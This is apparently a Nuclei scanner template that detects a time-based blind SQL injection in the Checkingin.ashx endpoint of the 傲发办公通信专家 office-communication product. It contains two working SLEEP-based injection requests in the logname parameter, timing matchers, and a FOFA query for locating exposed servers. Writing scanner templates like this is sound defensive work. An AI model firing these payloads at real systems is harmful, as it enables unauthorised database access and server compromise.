http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /handle/Checkingin.ashx?type=checkingin&logname='+and+(SELECT+*+FROM+(SELECT(SLEEP(4)))x)+and+'&date=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        - |
          GET /handle/Checkingin.ashx?type=checkingin&logname='+and+(SELECT+*+FROM+(SELECT(SLEEP(8)))x)+and+'&date=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
id: aofa-Checkingin_ashx-sql-time
info:
    author: Superhero
    description: |-
        fofa: body="getincommingcall"
        傲发办公通信专家 Checkingin.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 傲发办公通信专家 Checkingin.ashx sql注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/yXhs5qLmTSRkKQzmI1nm5w
    severity: high
    tags: []
